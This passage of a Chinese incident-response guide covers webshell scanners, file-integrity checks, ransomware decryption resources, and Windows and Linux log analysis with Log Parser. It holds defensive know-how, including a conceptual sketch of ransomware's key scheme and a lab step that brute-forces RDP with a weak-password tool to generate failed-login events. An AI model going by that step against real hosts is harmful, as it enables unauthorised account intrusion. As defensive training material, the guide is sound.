</div>
</div>
</div>
<div id="outline-container-h:76205d2d-9ada-4aa7-a8de-8ce3e5e8b5a1" class="outline-5">
<h5 id="h:76205d2d-9ada-4aa7-a8de-8ce3e5e8b5a1">Webshell查杀</h5>
<div class="outline-text-5" id="text-h:76205d2d-9ada-4aa7-a8de-8ce3e5e8b5a1">
<p>
河马 WebShell 查杀：<a href="http://www.shellpub.com">http://www.shellpub.com</a><br>
官方文档详细<br>
</p>
</div>
</div>
</div>
<div id="outline-container-h:515b7fac-1aea-487e-99fb-39fa5ec07c29" class="outline-4">
<h4 id="h:515b7fac-1aea-487e-99fb-39fa5ec07c29">常见的WebShell查杀工具</h4>
<div class="outline-text-4" id="text-h:515b7fac-1aea-487e-99fb-39fa5ec07c29">
<p>
当网站服务器被入侵时，我们需要一款Webshell检测工具，来帮助我们发现Webshell，进一步排查系统可能存在的安全漏洞。<br>
网站中正常的系统命令一般写在代码中，不会在流量中体现，由此来发现不安全操作。<br>
</p>
</div>
</div>
<div id="outline-container-h:4a23836f-be6e-4226-a4f4-0b8ffc004a6e" class="outline-4">
<h4 id="h:4a23836f-be6e-4226-a4f4-0b8ffc004a6e">D盾_Web查杀</h4>
<div class="outline-text-4" id="text-h:4a23836f-be6e-4226-a4f4-0b8ffc004a6e">
<p>
阿D出品，使用自行研发不分扩展名的代码分析引擎，能分析更为隐藏的 WebShell 后门行为。<br>
兼容性：只提供 Windows 版本。<br>
工具下载地址：<a href="http://www.d99net.net">http://www.d99net.net</a><br>
</p>
</div>
</div>
<div id="outline-container-h:d8ad6e7d-696f-4ffe-a10b-dabf7900fb40" class="outline-4">
<h4 id="h:d8ad6e7d-696f-4ffe-a10b-dabf7900fb40">百度 WEBDIR+</h4>
<div class="outline-text-4" id="text-h:d8ad6e7d-696f-4ffe-a10b-dabf7900fb40">
<p>
下一代 WebShell 检测引擎，采用先进的动态监测技术，结合多种引擎零规则查杀。<br>
兼容性：提供在线查杀木马，免费开放 API 支持批量检测。<br>
在线查杀地址：<a href="https://scanner.baidu.com/#/pages/intro">https://scanner.baidu.com/#/pages/intro</a><br>
</p>
</div>
</div>
<div id="outline-container-h:cc423dff-f97d-415c-950e-a755f0faead8" class="outline-4">
<h4 id="h:cc423dff-f97d-415c-950e-a755f0faead8">河马</h4>
<div class="outline-text-4" id="text-h:cc423dff-f97d-415c-950e-a755f0faead8">
<p>
专注 WebShell 查杀研究，拥有海量 WebShell 样本和自主查杀技术，采用传统特征+云端大数据双引擎<br>
的查杀技术。查杀速度快、精度高、误报低。<br>
兼容性：支持 Windows、Linux，支持在线查杀。<br>
官方网站：<a href="https://www.shellpub.com">https://www.shellpub.com</a><br>
</p>
</div>
</div>
<div id="outline-container-h:990f249f-8062-447d-956a-bafecf9ffd7f" class="outline-4">
<h4 id="h:990f249f-8062-447d-956a-bafecf9ffd7f">Web Shell Detector</h4>
<div class="outline-text-4" id="text-h:990f249f-8062-447d-956a-bafecf9ffd7f">
<p>
Web Shell Detector 具有 WebShell 签名数据库，可帮助识别高达 99％ 的 WebShell。<br>
兼容性：提供 PHP、Python 脚本，可跨平台，在线检测。<br>
官方网站：<a href="http://www.shelldetector.com">http://www.shelldetector.com</a><br>
</p>
</div>
</div>
<div id="outline-container-h:da89d3a2-b79f-4c67-85fb-430251e5a244" class="outline-4">
<h4 id="h:da89d3a2-b79f-4c67-85fb-430251e5a244">CloudWalker（牧云）</h4>
<div class="outline-text-4" id="text-h:da89d3a2-b79f-4c67-85fb-430251e5a244">
<p>
一个可执行命令行版本的 Webshell 检测工具。<br>
兼容性：暂时只支持 PHP Webshell 的检测。<br>
在线查杀 demo：<a href="https://webshellchop.chaitin.cn/demo/">https://webshellchop.chaitin.cn/demo/</a><br>
GitHub 项目地址：<a href="https://github.com/chaitin/cloudwalker">https://github.com/chaitin/cloudwalker</a><br>
</p>
</div>
</div>
</div>
<div id="outline-container-h:bef7aac0-add2-483b-95dd-458ed18abf1f" class="outline-3">
<h3 id="h:bef7aac0-add2-483b-95dd-458ed18abf1f">如何发现隐藏的WebShell后门</h3>
<div class="outline-text-3" id="text-h:bef7aac0-add2-483b-95dd-458ed18abf1f">
<p>
如何在百万行代码里发现隐藏的后门？<br>
</p>

<p>
试想一下，如果你的网站被入侵，攻击者留下隐藏的后门，你真的都可以找出来吗？面对一个大中型的应用系统，数以百万级的代码行，是不可能做到每个文件每段代码进行手工检查的。即使是一款拥有99.9% 的 Webshell 检出率的检测引擎，依然可能存在 Webshell 绕过的情况。另外，像暗链、网页劫持、页面跳转等常见的黑帽 SEO 手法，也很难通过手动检测或工具检测全部识别出来。<br>
</p>

<p>
最好的方式就是做文件完整性验证。通过与原始代码对比，可以快速发现文件是否被篡改以及被篡改的位置。当然，前提是要具备代码版本管理的能力。<br>
</p>

<p>
下列几种文件完整性验证方式，可以找出代码中所有隐藏的后门。<br>
</p>
</div>
<div id="outline-container-h:e6afe316-bfc8-4104-bd44-620dce8dc173" class="outline-4">
<h4 id="h:e6afe316-bfc8-4104-bd44-620dce8dc173">MD5校验</h4>
<div class="outline-text-4" id="text-h:e6afe316-bfc8-4104-bd44-620dce8dc173">
<p>
下载D盾_Web查杀工具的时候，我们可以留意到下载的压缩包里有一个 exe 可执行文件，拥有自身的md5 值。这个是软件作者在发布软件时，通过 md5 算法计算出该 exe 文件的"特征值"。<br>
</p>

<p>
下载地址：<a href="https://www.d99net.net/down/d_safe_2.1.7.2.zip">https://www.d99net.net/down/d_safe_2.1.7.2.zip</a><br>
文件 MD5：e2ec949fd70c4c921ee38979dda39d11 D_Safe_Manage.exe<br>
</p>
<div class="org-src-container">
<pre class="src src-nil">C:\Users\jasper\d_safe_2.1.7.2&gt;certutil -hashfile D_Safe_Manage.exe MD5
MD5 hash of D_Safe_Manage.exe:
e2ec949fd70c4c921ee38979dda39d11
CertUtil: -hashfile command completed successfully.
</pre>
</div>

<p>
当用户下载软件时，可以使用相同的校验算法计算下载到 exe 文件的特征值，并与软件开发者发布的特征值比较。如果两个特征值相同，则认为下载到的 exe 文件是正确的。如果两个特征值不同，则认为下载到 exe 文件是被篡改过的。<br>
</p>

<p>
那同理可得，我们可以将所有网站文件计算一次 hash 值保存，当出现应急情况时，重新计算一次 hash值，并与上次保存的 hash 值进行对比，从而输出新创建的、修改过及删除的文件列表。<br>
</p>

<p>
文件 hash 值计算：<br>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">def</span> <span style="color: #0000ff;">md5sum</span>(<span style="color: #483d8b;">file</span>):
    <span style="color: #a0522d;">m</span>=hashlib.md5()
    <span style="color: #a020f0;">if</span> os.path.isfile(<span style="color: #483d8b;">file</span>):
        <span style="color: #a0522d;">f</span>=<span style="color: #483d8b;">open</span>(<span style="color: #483d8b;">file</span>,<span style="color: #8b2252;">'rb'</span>)
        <span style="color: #a020f0;">for</span> line <span style="color: #a020f0;">in</span> f:
            m.update(line)
        f.close
    <span style="color: #a020f0;">else</span>:
        m.update(<span style="color: #483d8b;">file</span>)
    <span style="color: #a020f0;">return</span> (m.hexdigest())
</pre>
</div>

<p>
对文件进行哈希值重新计算，进行校验对比。<br>
</p>
</div>
</div>
<div id="outline-container-h:ed1bfc2e-bfc6-4c8d-ad98-04abf6b0790b" class="outline-4">
<h4 id="h:ed1bfc2e-bfc6-4c8d-ad98-04abf6b0790b">diff 命令</h4>
<div class="outline-text-4" id="text-h:ed1bfc2e-bfc6-4c8d-ad98-04abf6b0790b">
<p>
在 Linux 中，可以使用 diff 命令来比较两个文本文件的差异。同样，我们可以通过一行命令快速找出两个项目文件的差异。<br>
</p>

<p>
-a diff预设只会逐行比较文本文件<br>
-c 上下文格式（context diff)<br>
-r 比较子目录中的文件<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">diff -c -a -r 2.php 3.php
</pre>
</div>


<figure id="orgc78dd1f">
<img src="./images/img_20230814_162712.png" alt="img_20230814_162712.png" width="60%"><br>

</figure>

<p>
如果只是想查看两个文件是否不同又不想显示差异之处的话，可以加上 -q 选项。<br>
</p>
</div>
</div>
<div id="outline-container-h:fcb4464a-9c37-4ec8-b05f-16c74ec30fcc" class="outline-4">
<h4 id="h:fcb4464a-9c37-4ec8-b05f-16c74ec30fcc">文件对比工具</h4>
<div class="outline-text-4" id="text-h:fcb4464a-9c37-4ec8-b05f-16c74ec30fcc">
<p>
关键词：代码对比工具，你会找到很多好用的工具，这里我们推荐两款效果还不错的工具，Beyond Compare 和 WinMerge。<br>
</p>

<p>
<b>Beyond Compare</b><br>
</p>

<p>
Beyond Compare 是一套由 Scooter Software 推出的文件比较工具。主要用途是对比两个文件夹或者文件，并将差异以颜色标示，比较范围包括目录，文档内容等。<br>
</p>

<p>
下载地址：<a href="http://www.scootersoftware.com/download.php">http://www.scootersoftware.com/download.php</a><br>
</p>

<p>
软件使用示例，通过文件夹比较，找出文件夹中的差异内容：双击 Beyond Compare ，打开软件主页，选择文件夹比较，分别加载两个文件夹，直接比较即可。<br>
</p>


<figure id="orga26daa6">
<img src="./images/img_20230814_162915.png" alt="img_20230814_162915.png" width="60%"><br>

</figure>

<p>
<b>WinMerge</b><br>
</p>

<p>
WinMerge 是一款运行于 Windows 系统下的文件比较和合并工具，使用它可以非常方便地比较文件夹和文件，以易于理解的可视文本格式显示差异。<br>
</p>

<p>
下载地址：<a href="https://winmerge.org/downloads/">https://winmerge.org/downloads/</a><br>
</p>


<figure id="orgf0716ac">
<img src="./images/img_20230814_162934.png" alt="img_20230814_162934.png" width="60%"><br>

</figure>

<p>
1、文件 &#x2013; 打开，选择文件或文件夹，然后点击进行比较。<br>
2、在同一个界面里，通过颜色和文本提示，显示文件夹内容差异。<br>
</p>
</div>
</div>
</div>
<div id="outline-container-h:f785651d-4c48-4940-8edc-035dd5e57059" class="outline-3">
<h3 id="h:f785651d-4c48-4940-8edc-035dd5e57059">勒索病毒自救指南</h3>
<div class="outline-text-3" id="text-h:f785651d-4c48-4940-8edc-035dd5e57059">
</div>
<div id="outline-container-h:26cb4d10-921a-4d32-bd8d-eacb5892f671" class="outline-4">
<h4 id="h:26cb4d10-921a-4d32-bd8d-eacb5892f671">勒索病毒加密原理</h4>
<div class="outline-text-4" id="text-h:26cb4d10-921a-4d32-bd8d-eacb5892f671">

<figure id="org3938855">
<img src="./images/img_20230814_163012.png" alt="img_20230814_163012.png" width="60%"><br>

</figure>

<p>
<b>原理</b><br>
</p>

<p>
公开密钥密码体系要求密钥成对出现，一个用于加密，另一个用于解密，并且不可能从其中一个推导出另一个。<br>
</p>

<p>
<b>加密过程</b><br>
1、病毒作者首先在自己电脑上生成的 私钥Q 和 公钥Q<br>
2、病毒在目标电脑上随机生成 私钥Z 和 公钥Z<br>
3、将用户电脑上的文件通过 公钥Z 加密<br>
4、将用户电脑上的 私钥Z 通过 公钥Q 加密<br>
5、删除用户电脑上的 私钥Z 、公钥Q、数据<br>
</p>

<p>
<b>解密过程</b><br>
</p>

<p>
支付完赎金之后获得 私钥Q ，通过用户的 加密私钥 解出 私钥Z，通过 私钥Z 解密 用户数据。<br>
</p>
</div>
</div>
<div id="outline-container-h:85408cb0-64ca-4c57-977a-3672675d5ffa" class="outline-4">
<h4 id="h:85408cb0-64ca-4c57-977a-3672675d5ffa">勒索病毒搜索引擎</h4>
<div class="outline-text-4" id="text-h:85408cb0-64ca-4c57-977a-3672675d5ffa">
<p>
在勒索病毒搜索引擎输入病毒名、勒索邮箱、被加密后文件的后缀名，或直接上传被加密文件、勒索提示信息，即可快速查找到病毒详情和解密工具。<br>
</p>

<p>
【360】 勒索病毒搜索引擎，支持检索超过800种常见勒索病毒<br>
官网：<a href="http://lesuobingdu.360.cn">http://lesuobingdu.360.cn</a><br>
【腾讯】 勒索病毒搜索引擎，支持检索超过 1000+ 种常见勒索病毒<br>
官网：<a href="https://guanjia.qq.com/pr/ls">https://guanjia.qq.com/pr/ls</a><br>
【启明】VenusEye勒索病毒搜索引擎，超300种勒索病毒家族<br>
官网：<a href="https://lesuo.venuseye.com.cn">https://lesuo.venuseye.com.cn</a><br>
【奇安信】勒索病毒搜索引擎<br>
官网：<a href="https://lesuobingdu.qianxin.com">https://lesuobingdu.qianxin.com</a><br>
【深信服】勒索病毒搜索引擎<br>
官网：<a href="https://edr.sangfor.com.cn/#/information/ransom_search">https://edr.sangfor.com.cn/#/information/ransom_search</a><br>
</p>
</div>
</div>
<div id="outline-container-h:646074d3-1eaf-4e6a-8fae-cbdd4e19cc4f" class="outline-4">
<h4 id="h:646074d3-1eaf-4e6a-8fae-cbdd4e19cc4f">勒索软件解密工具集</h4>
<div class="outline-text-4" id="text-h:646074d3-1eaf-4e6a-8fae-cbdd4e19cc4f">
<p>
很多安全公司都提供了免费的勒索病毒解密工具下载，收集和整理相关下载地址，可以帮助我们了解和获取最新的勒索病毒解密工具。<br>
</p>

<p>
【腾讯哈勃】勒索软件专杀工具<br>
官网：<a href="https://habo.qq.com/tool">https://habo.qq.com/tool</a><br>
【金山毒霸】勒索病毒免疫工具<br>
官网：<a href="http://www.duba.net/dbt/wannacry.html">http://www.duba.net/dbt/wannacry.html</a><br>
【火绒】安全工具下载<br>
官网：<a href="http://bbs.huorong.cn/forum-55-1.html">http://bbs.huorong.cn/forum-55-1.html</a><br>
【瑞星】解密工具下载<br>
官网：<a href="http://it.rising.com.cn/fanglesuo/index.html">http://it.rising.com.cn/fanglesuo/index.html</a><br>
【nomoreransom】勒索软件解密工具集<br>
官网：<a href="https://www.nomoreransom.org/zh/index.html">https://www.nomoreransom.org/zh/index.html</a><br>
【MalwareHunterTeam】勒索软件解密工具集<br>
官网：<a href="https://id-ransomware.malwarehunterteam.com">https://id-ransomware.malwarehunterteam.com</a><br>
【卡巴斯基】免费勒索解密器<br>
官网：<a href="https://noransom.kaspersky.com">https://noransom.kaspersky.com</a><br>
【Avast】免费勒索软件解密工具<br>
官网：<a href="https://www.avast.com/zh-cn/ransomware-decryption-tools">https://www.avast.com/zh-cn/ransomware-decryption-tools</a><br>
【Emsisoft】免费勒索软件解密工具<br>
官网：<a href="https://www.emsisoft.com/ransomware-decryption-tools/free-download">https://www.emsisoft.com/ransomware-decryption-tools/free-download</a><br>
【GitHub 项目】勒索病毒解密工具收集汇总<br>
官网：<a href="https://github.com/jiansiting/Decryption-Tools">https://github.com/jiansiting/Decryption-Tools</a><br>
</p>

<p>
针对勒索病毒最好的防御方法就是备份。<br>
</p>
</div>
</div>
</div>
</section>
<section id="outline-container-h:c26653c9-8354-4a48-b1aa-5154167bcb3a" class="outline-2">
<h2 id="h:c26653c9-8354-4a48-b1aa-5154167bcb3a">日志分析</h2>
<div class="outline-text-2" id="text-h:c26653c9-8354-4a48-b1aa-5154167bcb3a">
<p>
主要内容：<br>
</p>
<ul class="org-ul">
<li>Windows 日志分析<br></li>
<li>Linux 日志分析<br></li>
<li>web 日志分析<br></li>
<li>MySQL 日志分析<br></li>
</ul>
</div>
<div id="outline-container-h:c630603c-65f4-4635-b0a6-ed004a034cd5" class="outline-3">
<h3 id="h:c630603c-65f4-4635-b0a6-ed004a034cd5">Windows日志分析</h3>
<div class="outline-text-3" id="text-h:c630603c-65f4-4635-b0a6-ed004a034cd5">
<p>
<b>使用环境：Windows Server 2008 R2</b><br>
</p>
</div>
<div id="outline-container-h:84bcb036-c79c-464d-986c-1971f5175d94" class="outline-4">
<h4 id="h:84bcb036-c79c-464d-986c-1971f5175d94">Windows事件日志简介</h4>
<div class="outline-text-4" id="text-h:84bcb036-c79c-464d-986c-1971f5175d94">
<p>
Windows系统日志是记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。用户可以通过它来检查错误发生的原因，或者寻找受到攻击时攻击者留下的痕迹。<br>
</p>

<p>
Windows主要有以下三类日志记录系统事件：应用程序日志、系统日志和安全日志。<br>
</p>

<p>
开始菜单&#x2013;&gt;管理工具&#x2013;&gt;事件查看器<br>
</p>

<p>
<b>系统日志</b><br>
</p>

<div class="org-src-container">
<pre class="src src-sh">&#35760;&#24405;&#25805;&#20316;&#31995;&#32479;&#32452;&#20214;&#20135;&#29983;&#30340;&#20107;&#20214;&#65292;&#20027;&#35201;&#21253;&#25324;&#39537;&#21160;&#31243;&#24207;&#12289;&#31995;&#32479;&#32452;&#20214;&#21644;&#24212;&#29992;&#36719;&#20214;&#30340;&#23849;&#28291;&#20197;&#21450;&#25968;&#25454;&#20002;&#22833;&#38169;&#35823;&#31561;&#12290;&#31995;&#32479;&#26085; &#24535;&#20013;&#35760;&#24405;&#30340;&#26102;&#38388;&#31867;&#22411;&#30001;Windows&#25805;&#20316;&#31995;&#32479;&#39044;&#20808;&#23450;&#20041;&#12290;
&#40664;&#35748;&#20301;&#32622;&#65306; %SystemRoot%\System32\Winevt\Logs\System.evtx
</pre>
</div>

<p>
<b>应用程序日志</b><br>
</p>

<div class="org-src-container">
<pre class="src src-sh">&#21253;&#21547;&#30001;&#24212;&#29992;&#31243;&#24207;&#25110;&#31995;&#32479;&#31243;&#24207;&#35760;&#24405;&#30340;&#20107;&#20214;&#65292;&#20027;&#35201;&#35760;&#24405;&#31243;&#24207;&#36816;&#34892;&#26041;&#38754;&#30340;&#20107;&#20214;&#65292;&#20363;&#22914;&#25968;&#25454;&#24211;&#31243;&#24207;&#21487;&#20197;&#22312;&#24212;&#29992;&#31243;&#24207;&#26085;&#24535; &#20013;&#35760;&#24405;&#25991;&#20214;&#38169;&#35823;&#65292;&#31243;&#24207;&#24320;&#21457;&#20154;&#21592;&#21487;&#20197;&#33258;&#34892;&#20915;&#23450;&#30417;&#35270;&#21738;&#20123;&#20107;&#20214;&#12290;&#22914;&#26524;&#26576;&#20010;&#24212;&#29992;&#31243;&#24207;&#20986;&#29616;&#23849;&#28291;&#24773;&#20917;&#65292;&#37027;&#20040;&#25105;&#20204;&#21487;&#20197; &#20174;&#31243;&#24207;&#20107;&#20214;&#26085;&#24535;&#20013;&#25214;&#21040;&#30456;&#24212;&#30340;&#35760;&#24405;&#12290;

&#40664;&#35748;&#20301;&#32622;&#65306;%SystemRoot%\System32\Winevt\Logs\Application.evtx
</pre>
</div>

<p>
<b>安全日志</b><br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&#35760;&#24405;&#31995;&#32479;&#30340;&#23433;&#20840;&#23457;&#35745;&#20107;&#20214;&#65292;&#21253;&#21547;&#21508;&#31181;&#31867;&#22411;&#30340;&#30331;&#24405;&#26085;&#24535;&#12289;&#23545;&#35937;&#35775;&#38382;&#26085;&#24535;&#12289;&#36827;&#31243;&#36861;&#36394;&#26085;&#24535;&#12289;&#29305;&#26435;&#20351;&#29992;&#12289;&#36134;&#21495;&#31649;&#29702;&#12289; &#31574;&#30053;&#21464;&#26356;&#12289;&#31995;&#32479;&#20107;&#20214;&#12290;&#23433;&#20840;&#26085;&#24535;&#20063;&#26159;&#35843;&#26597;&#21462;&#35777;&#20013;&#26368;&#24120;&#29992;&#21040;&#30340;&#26085;&#24535;&#12290;&#40664;&#35748;&#35774;&#32622;&#19979;&#65292;&#23433;&#20840;&#26085;&#24535;&#26159;&#20851;&#38381;&#30340;&#65292;&#21487;&#20197;&#20351;&#29992; &#32452;&#31574;&#30053;&#26469;&#21551;&#21160;&#23433;&#20840;&#26085;&#24535;&#65292;&#25110;&#32773;&#22312;&#27880;&#20876;&#34920;&#20013;&#35774;&#32622;&#23457;&#26680;&#31574;&#30053;&#65292;&#20197;&#20415;&#24403;&#23433;&#20840;&#26085;&#24535;&#28385;&#21518;&#20351;&#31995;&#32479;&#20572;&#27490;&#21709;&#24212;&#12290;

&#40664;&#35748;&#20301;&#32622;&#65306;%SystemRoot%\System32\Winevt\Logs\Security.evtx
</pre>
</div>

<p>
系统日志和应用程序日志存储着故障排除信息，对于系统管理员更为有用。安全日志记录着事件审计信息，包括用户验证（登录、远程访问等）和特定用户在认证后对系统做了什么，对于应急人员而言，更有帮助。<br>
</p>
</div>
</div>
<div id="outline-container-h:501e691b-deb4-4a5c-9908-e2353893bed7" class="outline-4">
<h4 id="h:501e691b-deb4-4a5c-9908-e2353893bed7">审核策略与事件查看器</h4>
<div class="outline-text-4" id="text-h:501e691b-deb4-4a5c-9908-e2353893bed7">
<p>
Windows Server 2008 R2 系统的审核功能在默认状态下并没有启用，建议开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。<br>
PS：默认状态下，也会记录一些简单的日志，日志默认大小20M<br>
</p>

<p>
设置：开始 → 管理工具 → 本地安全策略 → 本地策略 → 审核策略，本地安全设置。<br>
</p>

<p>
默认都未审核，双击可以针对不同事件做成功和失败审核。<br>
</p>


<figure id="orgcdea11e">
<img src="./images/img_20230814_163557.png" alt="img_20230814_163557.png" width="60%"><br>

</figure>


<p>
<b>查看系统日志方法：</b><br>
1、在“开始”菜单上，依次指向“所有程序”、“管理工具”，然后单击“事件查看器”<br>
2、按 "Window+R"，输入 ”eventvwr.msc“ 也可以直接进入“事件查看器”<br>
</p>
</div>
</div>
<div id="outline-container-h:d84fa5fc-07c9-4ac3-82be-916dde99148a" class="outline-4">
<h4 id="h:d84fa5fc-07c9-4ac3-82be-916dde99148a">事件日志分析</h4>
<div class="outline-text-4" id="text-h:d84fa5fc-07c9-4ac3-82be-916dde99148a">
<p>
对于Windows事件日志分析，不同的EVENT ID代表了不同的意义，摘录一些常见的安全事件的说明：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&#20107;&#20214;ID &#35828;&#26126;
4624 &#30331;&#24405;&#25104;&#21151;
4625 &#30331;&#24405;&#22833;&#36133;
4634 &#27880;&#38144;&#25104;&#21151;
4647 &#29992;&#25143;&#21551;&#21160;&#30340;&#27880;&#38144;
4672 &#20351;&#29992;&#36229;&#32423;&#29992;&#25143;&#65288;&#22914;&#31649;&#29702;&#21592;&#65289;&#36827;&#34892;&#30331;&#24405;
4720 &#21019;&#24314;&#29992;&#25143;
</pre>
</div>

<p>
案例：暴力破解排查<br>
windows 2008 开始菜单&#x2013;&gt;计算机右键属性&#x2013;&gt;远程设置&#x2013;&gt;选择"允许运行任意版本远程桌面的计算机连接"，然后使用爆破工具爆破，如超级弱口令工具。<br>
</p>

<ol class="org-ol">
<li>在“开始”菜单上，依次指向“所有程序”、“管理工具”，然后单击“事件查看器”；<br></li>
<li>在事件查看器中，单击“安全”，查看安全日志；<br></li>
<li>在安全日志右侧操作中，点击“筛选当前日志”，输入事件ID进行筛选。<br></li>
</ol>
<p>
4624 &#x2013; 登录成功<br>
4625 &#x2013; 登录失败<br>
4634 &#x2013; 注销成功<br>
4647 &#x2013; 用户启动的注销<br>
4672 &#x2013; 使用超级用户（如管理员）进行登录<br>
</p>

<p>
输入事件ID：4625进行日志筛选，发现事件ID：4625，假如事件数是175904，即代表用户登录失败了175904次，那么这台服务器管理员账号可能遭遇了暴力破解。<br>
</p>
</div>
</div>
<div id="outline-container-h:1082091b-d219-4164-beed-333c51aa58dc" class="outline-4">
<h4 id="h:1082091b-d219-4164-beed-333c51aa58dc">日志分析工具</h4>
<div class="outline-text-4" id="text-h:1082091b-d219-4164-beed-333c51aa58dc">
</div>
<div id="outline-container-h:96ad6e3b-e163-4d5e-84e8-542eda403c90" class="outline-5">
<h5 id="h:96ad6e3b-e163-4d5e-84e8-542eda403c90">Log Parser</h5>
<div class="outline-text-5" id="text-h:96ad6e3b-e163-4d5e-84e8-542eda403c90">
<p>
Log Parser（是微软公司出品的日志分析工具，它功能强大，使用简单，可以分析基于文本的日志文件、XML 文件、CSV（逗号分隔符）文件，以及操作系统的事件日志、注册表、文件系统、Active Directory。它可以像使用 SQL 语句一样查询分析这些数据，甚至可以把分析结果以各种图表的形式展现出来。<br>
</p>

<p>
Log Parser 2.2下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">https://www.microsoft.com/en-us/download/details.aspx?id=24659</a><br>
Log Parser 使用示例：<a href="https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/">https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/</a><br>
</p>

<p>
<b>基本查询结构</b><br>
</p>
<div class="org-src-container">
<pre class="src src-sh">Logparser.exe &#8211;i:EVT &#8211;o:DATAGRID <span style="color: #8b2252;">"SELECT * FROM c:\xx.evtx"</span>
</pre>
</div>

<p>
<b>使用Log Parser分析日志</b><br>
1、查询登录成功的事件<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&#30331;&#24405;&#25104;&#21151;&#30340;&#25152;&#26377;&#20107;&#20214;
LogParser.exe -i:EVT &#8211;o:DATAGRID <span style="color: #8b2252;">"SELECT * FROM c:\security.evtx where EventID=4624"</span>

&#25351;&#23450;&#30331;&#24405;&#26102;&#38388;&#33539;&#22260;&#30340;&#20107;&#20214;&#65306;
LogParser.exe -i:EVT &#8211;o:DATAGRID <span style="color: #8b2252;">"SELECT * FROM c:\Security.evtx where TimeGenerated&gt;'2022-11-05 00:00:00' and TimeGenerated&lt;'2022-11-06 00:00:00' and EventID=4624"</span>

&#25552;&#21462;&#30331;&#24405;&#25104;&#21151;&#30340;&#29992;&#25143;&#21517;&#21644;IP&#65306;
LogParser.exe -i:EVT &#8211;o:DATAGRID <span style="color: #8b2252;">"SELECT EXTRACT_TOKEN(Message,13,' ') as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,'|') as Username,EXTRACT_TOKEN(Message,38,' ') as Loginip FROM c:\security.evtx where EventID=4624"</span>
</pre>
</div>

<p>
2、查询登录失败的事件<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">&#30331;&#24405;&#22833;&#36133;&#30340;&#25152;&#26377;&#20107;&#20214;&#65306;
LogParser.exe -i:EVT &#8211;o:DATAGRID <span style="color: #8b2252;">"SELECT * FROM c:\security.evtx where EventID=4625"</span>

&#25552;&#21462;&#30331;&#24405;&#22833;&#36133;&#29992;&#25143;&#21517;&#36827;&#34892;&#32858;&#21512;&#32479;&#35745;&#65306; LogParser.exe -i:EVT <span style="color: #8b2252;">"SELECT EXTRACT_TOKEN(Message,13,' ') as EventType,EXTRACT_TOKEN(Message,19,' ') as user,count(EXTRACT_TOKEN(Message,19,' ')) as Times,EXTRACT_TOKEN(Message,39,' ') as Loginip FROM c:\security.evtx where EventID=4625 GROUP BY Message"</span>
</pre>
</div>

<p>
3、系统历史开关机记录<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">LogParser.exe -i:EVT &#8211;o:DATAGRID <span style="color: #8b2252;">"SELECT TimeGenerated,EventID,Message FROM c:\System.evtx where EventID=6005 or EventID=6006"</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-h:a5f29dc0-75c8-4f23-bbdd-fc7654bafc65" class="outline-5">
<h5 id="h:a5f29dc0-75c8-4f23-bbdd-fc7654bafc65">LogParser Lizard</h5>
<div class="outline-text-5" id="text-h:a5f29dc0-75c8-4f23-bbdd-fc7654bafc65">
<p>
对于GUI环境的Log Parser Lizard，其特点是比较易于使用，甚至不需要记忆繁琐的命令，只需要做好设置，写好基本的SQL语句，就可以直观的得到结果。<br>
</p>

<p>
下载地址：<a href="http://www.lizard-labs.com/log_parser_lizard.aspx">http://www.lizard-labs.com/log_parser_lizard.aspx</a><br>
</p>

<p>
依赖包：Microsoft .NET Framework 4.5，下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=42642">https://www.microsoft.com/en-us/download/details.aspx?id=42642</a><br>
</p>
</div>
</div>
</div>
<div id="outline-container-h:30d1ca31-a688-453a-bded-78a4bd92d239" class="outline-4">
<h4 id="h:30d1ca31-a688-453a-bded-78a4bd92d239">充内容</h4>
<div class="outline-text-4" id="text-h:30d1ca31-a688-453a-bded-78a4bd92d239">
<p>
Windows日志分析参考：<a href="https://mp.weixin.qq.com/s/ige5UO8WTuOOO3yRw-LeqQ">https://mp.weixin.qq.com/s/ige5UO8WTuOOO3yRw-LeqQ</a><br>
</p>
</div>
</div>
</div>
<div id="outline-container-h:76b03265-0d66-46bf-8179-5b57aaad24fc" class="outline-3">
<h3 id="h:76b03265-0d66-46bf-8179-5b57aaad24fc">Linux日志分析</h3>
<div class="outline-text-3" id="text-h:76b03265-0d66-46bf-8179-5b57aaad24fc">
<p>
<b>使用环境：CentOS</b><br>
</p>
</div>
<div id="outline-container-h:1078246b-c584-46c4-877b-b70783565d45" class="outline-4">
<h4 id="h:1078246b-c584-46c4-877b-b70783565d45">日志简介</h4>
<div class="outline-text-4" id="text-h:1078246b-c584-46c4-877b-b70783565d45">
<p>
日志默认存放位置：/var/log/<br>
查看日志配置情况：more /etc/rsyslog.conf<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">&#26085;&#24535;&#25991;&#20214; &#35828;&#26126;
/var/log/cron &#35760;&#24405;&#20102;&#31995;&#32479;&#23450;&#26102;&#20219;&#21153;&#30456;&#20851;&#30340;&#26085;&#24535;

/var/log/cups &#35760;&#24405;&#25171;&#21360;&#20449;&#24687;&#30340;&#26085;&#24535;

/var/log/dmesg &#35760;&#24405;&#20102;&#31995;&#32479;&#22312;&#24320;&#26426;&#26102;&#20869;&#26680;&#33258;&#26816;&#30340;&#20449;&#24687;&#65292;&#20063;&#21487;&#20197;&#20351;&#29992;dmesg&#21629;&#20196;&#30452;&#25509;&#26597;&#30475;&#20869;&#26680;&#33258;&#26816;&#20449;&#24687;

/var/log/mailog &#35760;&#24405;&#37038;&#20214;&#20449;&#24687;

